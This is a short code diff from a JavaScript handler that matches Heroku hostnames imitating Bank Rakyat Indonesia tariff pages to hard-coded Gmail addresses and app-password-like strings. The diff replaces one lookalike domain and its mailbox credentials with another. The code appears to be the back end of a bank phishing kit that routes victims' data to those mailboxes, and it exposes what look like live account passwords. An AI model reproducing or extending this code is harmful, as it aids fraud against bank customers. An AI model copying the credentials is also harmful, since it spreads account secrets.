@@ -19,10 +19,10 @@ export default function handler(req, res) {
        pass = 'lzefwsxzaeftnrip'
     }else
     
-     if (url == 'pilih-tarif-terbaru-bri.herokuapp.com'){
+   if (url == 'pilihan-tarif-brii-terbaru.herokuapp.com'){
 
-       email = 'gogglelink369@gmail.com'
-       pass = 'odheslxetxcoenkr'
+       email = 'linkgoggle500@gmail.com'
+       pass = 'dapwydphkoqywtiw'
     }else
     
      if (url == 'pilihan-tarif-bri-baru.herokuapp.com'){
